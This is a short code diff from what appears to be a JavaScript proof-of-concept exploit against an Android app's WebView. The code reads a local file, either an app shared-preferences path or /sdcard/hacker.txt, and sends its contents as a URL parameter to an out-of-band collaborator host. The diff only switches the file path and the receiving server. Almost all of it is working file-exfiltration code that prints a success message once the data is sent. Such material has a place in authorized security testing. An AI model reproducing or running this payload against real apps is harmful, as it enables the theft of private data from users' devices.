@@ -14,11 +14,11 @@
         }
         request.send();
       }
-      var filePath = "/data/data/com.mventus.selfcare.activity/shared_prefs/hacker.txt";
+      var filePath = "/sdcard/hacker.txt";
       exfiltrateFile(filePath, function(contents) {
             document.write(contents);
             var exfil = new XMLHttpRequest();
-            exfil.open("GET", "https://cjc0vtf2vtc0000a344ggjgyp7ryyyyyb.oast.fun/?filedata=" + contents, true);
+            exfil.open("GET", "https://agui5t0squ8fjcxaz8kc6m1a61cr0g.burpcollaborator.net/?filedata=" + contents, true);
               exfil.onload = function(event) {
                 document.write(" < /br>[+] File successfully exfiltrated to remote server");
                 }
